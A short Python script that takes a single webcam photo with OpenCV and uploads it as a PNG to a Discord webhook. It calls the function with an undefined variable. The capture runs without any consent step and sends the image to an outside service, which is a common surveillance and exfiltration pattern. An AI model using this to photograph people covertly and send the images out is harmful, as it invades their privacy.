import cv2
import requests
from io import BytesIO
from PIL import Image
def capture_and_send_to_discord(webhook_url):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Could not open webcam")
        return
    ret, frame = cap.read()
    if ret:
        rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        image = Image.fromarray(rgb_frame)
        img_byte_arr = BytesIO()
        image.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        files = {
            'file': ('webcam.png', img_byte_arr, 'image/png')
        }
        try:
            response = requests.post(webhook_url, files=files)
            if response.status_code == 200:
                print("Image successfully sent to Discord")
            else:
                print(f"Failed to send image. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending image: {str(e)}")
    cap.release()
capture_and_send_to_discord(webhook_url)
